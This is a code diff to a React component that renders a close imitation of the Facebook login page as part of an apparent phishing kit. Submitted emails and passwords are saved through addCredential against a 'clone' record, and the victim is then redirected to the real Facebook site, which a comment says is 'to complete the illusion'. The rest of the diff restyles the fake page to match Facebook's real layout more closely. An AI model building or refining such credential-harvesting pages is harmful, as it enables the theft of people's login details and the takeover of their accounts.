@@ -13,60 +13,59 @@ export default function FacebookPage({ clone }: { clone: Clone }) {
     if (email) {
       addCredential(clone.id, { username: email, password });
     }
-    window.location.href = 'https://www.facebook.com/login';
+    // Redirect to the actual facebook page to complete the illusion
+    window.location.href = 'https://www.facebook.com';
   };
 
   return (
-    <div className="bg-[#f0f2f5] min-h-screen flex flex-col items-center justify-center font-sans">
-      <div className="w-full max-w-md p-8">
-        <div className="text-center mb-8">
-          <h1 className="text-5xl font-bold text-[#1877f2] -m-4">facebook</h1>
-        </div>
-        <div className="bg-white p-6 rounded-lg shadow-lg w-full">
-          <p className="text-center text-lg text-gray-800 mb-6">
-            Log in to Facebook
+    <div className="bg-[#f0f2f5] min-h-screen flex items-center justify-center p-4 lg:p-0">
+      <div className="flex flex-col lg:flex-row items-center justify-center w-full max-w-5xl">
+        <div className="lg:w-1/2 lg:pr-12 mb-8 lg:mb-0 text-center lg:text-left">
+          <h1 className="text-6xl font-bold text-[#1877f2] -m-4">facebook</h1>
+          <p className="text-2xl mt-4 text-gray-800">
+            Facebook helps you connect and share with the people in your life.
           </p>
-          <form onSubmit={handleSubmit}>
-            <div className="mb-4">
+        </div>
+        <div className="lg:w-1/2 w-full max-w-md">
+          <div className="bg-white p-6 rounded-lg shadow-lg w-full">
+            <form onSubmit={handleSubmit} className="space-y-4">
               <input
                 type="text"
                 value={email}
                 onChange={(e) => setEmail(e.target.value)}
                 placeholder="Email address or phone number"
-                className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
+                className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 text-lg"
                 required
               />
-            </div>
-            <div className="mb-4">
               <input
                 type="password"
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
                 placeholder="Password"
-                className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
+                className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 text-lg"
               />
-            </div>
-            <button
-              type="submit"
-              className="w-full bg-[#1877f2] text-white py-3 rounded-md font-bold text-xl hover:bg-[#166fe5] transition-colors"
-            >
-              Log In
-            </button>
-            <div className="text-center mt-4">
-              <a href="#" className="text-sm text-[#1877f2] hover:underline">
-                Forgotten password?
-              </a>
-            </div>
-            <hr className="my-6 border-gray-300" />
-            <div className="text-center">
               <button
-                type="button"
-                className="bg-[#42b72a] text-white px-4 py-3 rounded-md font-bold hover:bg-[#36a420] transition-colors"
+                type="submit"
+                className="w-full bg-[#1877f2] text-white py-3 rounded-md font-bold text-xl hover:bg-[#166fe5] transition-colors"
               >
-                Create new account
+                Log In
               </button>
-            </div>
-          </form>
+              <div className="text-center">
+                <a href="#" className="text-sm text-[#1877f2] hover:underline">
+                  Forgotten password?
+                </a>
+              </div>
+              <hr className="border-gray-300" />
+              <div className="text-center">
+                <button
+                  type="button"
+                  className="bg-[#42b72a] text-white px-4 py-3 rounded-md font-bold hover:bg-[#36a420] transition-colors text-lg"
+                >
+                  Create new account
+                </button>
+              </div>
+            </form>
+          </div>
         </div>
       </div>
     </div>
